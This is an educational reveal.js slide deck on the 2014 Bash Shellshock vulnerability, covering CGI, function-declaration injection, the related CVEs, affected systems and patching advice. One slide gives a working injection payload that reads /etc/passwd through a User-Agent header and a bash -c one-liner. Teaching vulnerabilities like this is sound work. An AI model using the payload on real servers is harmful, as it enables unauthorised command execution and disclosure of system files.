@@ -1,0 +1,301 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+	<meta charset="utf-8">
+
+	<title>Shellshock</title>
+
+	<meta name="description" content="A framework for easily creating beautiful presentations using HTML">
+	<meta name="author" content="Sagittarius-a">
+
+	<meta name="apple-mobile-web-app-capable" content="yes">
+	<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+
+	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, minimal-ui">
+
+	<link rel="stylesheet" href="css/reveal.css">
+	<link rel="stylesheet" href="css/theme/night.css" id="theme">
+
+	<!-- Code syntax highlighting -->
+	<link rel="stylesheet" href="lib/css/zenburn.css">
+
+	<!-- Printing and PDF exports -->
+	<script>
+		var link = document.createElement( 'link' );
+		link.rel = 'stylesheet';
+		link.type = 'text/css';
+		link.href = window.location.search.match( /print-pdf/gi ) ? 'css/print/pdf.css' : 'css/print/paper.css';
+		document.getElementsByTagName( 'head' )[0].appendChild( link );
+	</script>
+
+		<!--[if lt IE 9]>
+		<script src="lib/js/html5shiv.js"></script>
+		<![endif]-->
+</head>
+
+<body>
+
+	<div class="reveal">
+
+		<!-- Any section element inside of this container is displayed as a slide -->
+		<div class="slides">
+			<section>
+				<h1>Shellshock</h1>
+				<h3>() { :;}; echo "Me Bash, Me suck"</h3>
+				<p>
+					<hr>
+					<small>Brought to you by <a href="http://hakim.se">Sagittarius-a</a></small>
+					<br>
+					<small>November, 27th 2015</small>
+				</p>
+			</section>
+			<!-- ########################################## -->
+			<section>
+				<h2>Roadmap</h2>
+				<br>
+				<p>
+				<ul>
+					<li>What is bash</li>
+					<li class="fragment">Shellshock overview</li>
+					<li class="fragment">Technical overview</li>
+					<li class="fragment">Impacs</li>
+					<li class="fragment">Demo</li>
+					<li class="fragment">Conclusion</li>
+				</ul>
+				</p>
+			</section>
+			<!-- ########################################## -->
+			<section>
+				<h2>First, What is Bash</h2>
+				<br>
+				<p>
+				<ul>
+					<li>Unix shell created in 1989 by Brian Fox, replacing the Bourne Shell</li>
+					<li class="fragment">Bashing together features of sh, csh & ksh</li>
+					<li class="fragment">Probably the most used shell</li>
+					<li class="fragment"><span>Default shell for Linux, some versions of Unix</span><span class="fragment">, ... and OS X</span></li>
+					<li class="fragment">Used to run scripts</li>
+				</ul>
+				</p>
+			</section>
+			<!-- Example of nested vertical slides -->
+			<section>
+				<section>
+					<h2>So ?</h2>
+				</section>
+				<section>
+					<h2>Shellshock</h2>
+					<li class="fragment">disclosed on 24 September 2014</li>
+					<li class="fragment">remember HeartBleed ?</li>
+					<li class="fragment">allowing an attacker to execute arbitrary commands</li>
+					<li class="fragment">tons of machines exposed</li>
+				</section>
+				<section>
+					<h2>Common Gateway Interface</h2>
+					<li class="fragment">standard environment for web servers to interface with executable programs</li>
+					<li class="fragment">used to render pages dynamically</li>
+					<li class="fragment">can be written in any programming language</li>
+					<li class="fragment">use environment variables</li>
+				</section>
+				<section>
+					<h2>Environment variables ?</h2>
+					<p>So how do you execute code ?</p>
+					<li class="fragment">Thanks to the function declaration in Bash</li>
+				</section>
+			</section>
+			<!-- ########################################## -->
+			<section data-markdown>
+				<script type="text/template">
+					## Bash functions
+
+					Declare and use a function with bash
+
+					```
+					$ vim() { echo "Y U NO NEOVIM"; }
+					```
+
+					Now execute it
+
+					```
+					$ vim
+					Y U NO NEOVIM
+					```
+				</script>
+			</section>
+			<!-- ########################################## -->
+			<section data-markdown>
+				<script type="text/template">
+					## Go deeper
+
+
+					```
+					$ env go='() { echo "declare"; }; echo "EOF" ' bash -c "go;"
+					```
+					Function declaration = execution
+
+					Last function call is useless anyway
+				</script>
+			</section>
+			<!-- ########################################## -->
+			<section data-markdown>
+				<script type="text/template">
+					## Use your payload >:]
+
+
+					```
+					echo $(</etc/passwd)
+					```
+					Inject it !
+					```
+					User-Agent: () { :;}; echo $(</etc/passwd)
+					            ^____________________________^
+					```
+					```
+					$ env doh='() { :;}; echo $(</etc/passwd) ' bash -c "doh;"
+					```
+				</script>
+			</section>
+			<!-- ########################################## -->
+			<section>
+				<h2>() { :;}; echo CVE</h2>
+				<p>Related Common Vulnerabilities and Exposures</p>
+				<p>
+					<ul>
+						<li>CVE-2014-6271</li>
+						<li>CVE-2014-6277[22]</li>
+						<li>CVE-2014-7169</li>
+					</ul>
+				</p>
+			</section>
+			<!-- ########################################## -->
+			<section data-markdown>
+				<script type="text/template">
+					## Is my bash vulnerable ?
+
+					V
+					```
+					if(bash.version < 4.3){
+						kernel.panic("OOPS");
+					}
+					```
+
+					Patched very quickly
+
+					```
+					$ bash --version
+					GNU bash, version 4.3.42(1)-release (x86_64-unknown-linux-gnu)
+					Copyright (C) 2013 Free Software Foundation, Inc.
+					Licence GPLv3+ : GNU GPL version 3 ou ultérieure <http://gnu.org/licenses/gpl.html>
+
+					This is free software; you are free to change and redistribute it.
+					There is NO WARRANTY, to the extent permitted by law.
+
+					```
+				</script>
+			</section>
+			<!-- ########################################## -->
+			<section>
+				<h2>Systems affected</h2>
+				<p>
+					<ul>
+						<li>UNIX hosts</li>
+						<li>Linux (like) hosts</li>
+						<li>Mac OS hosts</li>
+						<li>Routers</li>
+						<li>Switches</li>
+						<li>Firewalls</li>
+					</ul>
+				</p>
+			</section>
+			<section>
+				<h2>Softwares affected</h2>
+				<p></p>
+				<p>
+					<ul>
+						<li>dhclient</li>
+						<li>apache & mod_cgi (without mod_security properly configured)</li>
+						<li>exim - postfix - qmail - procmail</li>
+						<li>OpenVPN</li>
+						<li>stunnel</li>
+						<li>SSH (ForceCommand feature)</li>
+						<li>SIP, FTP</li>
+						<li>very likely tons of proprietary softwares</li>
+					</ul>
+				</p>
+			</section>
+			<!-- ########################################## -->
+			<section data-background="https://media.giphy.com/media/7JbMfrLQJmxUc/giphy.gif">
+				<h2>Demo</h2>
+			</section>
+			<!-- ########################################## -->
+			<section>
+				<h2>Impacts</h2>
+				<li class="fragment">High impact, low complexity</li>
+				<li class="fragment">Lot of attack vectors</li>
+				<li class="fragment">Make yourself at home</li>
+				<li class="fragment">Malware</li>
+				<li class="fragment">Botnets</li>
+				<li class="fragment">Planning delayed attacks</li>
+				<li class="fragment">IoT and not pacthed devices</li>
+				<li class="fragment">The only limit is your imagination</li>
+			</section>
+			<!-- ########################################## -->
+
+			<section>
+				<h2>How to fix it ?</h2>
+				<p>Find vulnerable systems</p>
+				<p>Fire up your best IDS/IPS systems</p>
+				<p>Sandbox all the things</p>
+				<p><strong>PATCH</strong> them as fast as possible</p>
+				<p>then restart your services, or reboot (eventually)</p>
+			</section>
+
+			<section>
+				<h2>Conclusion</h2>
+				<br>
+				<p>Get ready !</p>
+				<p>Know your enemy</p>
+				<p>Have a good patch management policy</p>
+				<p><strong>PATCH</strong> them as fast as possible</p>
+			</section>
+
+			<section style="text-align: left;">
+				<h1>THANK YOU</h1>
+				<p>
+					<a href="">- Questions anyone ?</a>
+					<br><br>
+					<a href="">- https://github.com/sagittarius-a/shellshocker-pocs</a>
+				</p>
+			</section>
+		</div>
+	</div>
+<script src="lib/js/head.min.js"></script>
+<script src="js/reveal.js"></script>
+
+<script>
+	// Full list of configuration options available at:
+	// https://github.com/hakimel/reveal.js#configuration
+	Reveal.initialize({
+		controls: true,
+		progress: true,
+		history: true,
+		center: true,
+
+		transition: 'slide', // none/fade/slide/convex/concave/zoom
+
+		// Optional reveal.js plugins
+		dependencies: [
+		{ src: 'lib/js/classList.js', condition: function() { return !document.body.classList; } },
+		{ src: 'plugin/markdown/marked.js', condition: function() { return !!document.querySelector( '[data-markdown]' ); } },
+		{ src: 'plugin/markdown/markdown.js', condition: function() { return !!document.querySelector( '[data-markdown]' ); } },
+		{ src: 'plugin/highlight/highlight.js', async: true, callback: function() { hljs.initHighlightingOnLoad(); } },
+		{ src: 'plugin/zoom-js/zoom.js', async: true },
+		{ src: 'plugin/notes/notes.js', async: true }
+		]
+	});
+
+</script>
+
+</body>
+</html>
